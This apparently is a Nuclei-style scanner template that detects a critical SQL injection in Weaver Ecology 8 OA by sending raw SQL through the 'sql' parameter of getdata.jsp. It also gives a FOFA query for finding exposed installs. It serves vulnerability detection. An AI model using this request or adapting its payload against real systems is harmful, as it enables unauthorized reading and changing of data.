id: ecology-v8-sqli
info:
  name: Ecology 8 - SQL Injection
  author: ritikchaddha
  severity: critical
  description: Ecology 8 has a vulnerability in which an attacker can execute SQL
    injection through a GET request, potentially gaining unauthorized access to sensitive
    information and able to modify data and execute administrative operations.
  reference:
  - http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20V8%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-89
  metadata:
    fofa-query: "app=\"\u6CDB\u5FAE-\u534F\u540C\u529E\u516COA\""
    impact: The SQL injection vulnerability in Ecology 8 can lead to unauthorized
      access to sensitive information, data modification, and unauthorized administrative
      operations, significantly impacting the security of the affected site.
    recommendation: It is recommended to immediately patch the SQL injection vulnerability
      in Ecology 8 to prevent potential unauthorized access and modification of sensitive
      data.
  tags: ecology,sqli
requests:
- method: GET
  path:
  - '{{BaseURL}}/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select+547653*865674+as+id'
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - '474088963122'
  - type: status
    status:
    - 200
